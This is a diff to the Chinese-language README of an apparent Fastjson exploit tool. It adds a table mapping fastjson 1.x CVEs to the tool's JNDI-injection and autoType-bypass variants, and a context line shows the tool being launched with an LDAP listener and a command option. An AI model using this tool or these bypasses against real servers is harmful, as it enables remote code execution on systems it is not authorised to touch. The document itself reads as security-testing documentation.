@@ -95,6 +95,19 @@ python3 fastjson_exploit.py ldap --lport 1389 --lhost <本机IP> --mode el --cmd
 python3 fastjson_exploit.py
 ```
 
+## CVE 覆盖对照（alibaba/fastjson 1.x 全部 5 个 CVE）
+
+| CVE | 影响版本 | 类型 | 工具覆盖 |
+|---|---|---|---|
+| CVE-2017-18349 | < 1.2.25 | RCE（@type 直打 JNDI） | ✅ plain 变体（1.2.24 靶场实测） |
+| CVE-2025-70974 (CVSS 10) | < 1.2.48 | autoType 处理缺陷 → JNDI 注入（1.2.25 修复不完整的绕过家族） | ✅ L/LL/bracket/mybatis/cache1247 变体矩阵（1.2.25-1.2.47 靶场实测） |
+| CVE-2022-25845 | ≤ 1.2.80 | expectClass 绕过默认 autoType 关闭 | ✅ 根级双 @type + 字段扫描（1.2.48-1.2.82 靶场实测） |
+| CVE-2026-16723 (CVSS 9) | 1.2.68-1.2.83 | @JSONType 远程类加载（无 gadget） | ⚠️ 探测/SSRF 阶段实测确认；defineClass 端受 JVM 构建差异限制（见 FAQ） |
+| CVE-2025-63617 | ktg-mes 应用层 | 应用组合漏洞 | ➖ 非_fastjson 本体缺陷，不适用 |
+
+> 未覆盖：**Fastjson2 QVD-2026-45876**（≤2.0.62，FNV-1a 哈希碰撞绕过白名单，默认配置 RCE，修复于 2.0.63）
+> ——独立产品/解析器，可作后续扩展方向。SafeMode 无已知通用绕过（公开研究一致结论）。
+
 ## 版本覆盖矩阵
 
 | Fastjson 版本 | 自动尝试的变体 | 前置条件 |
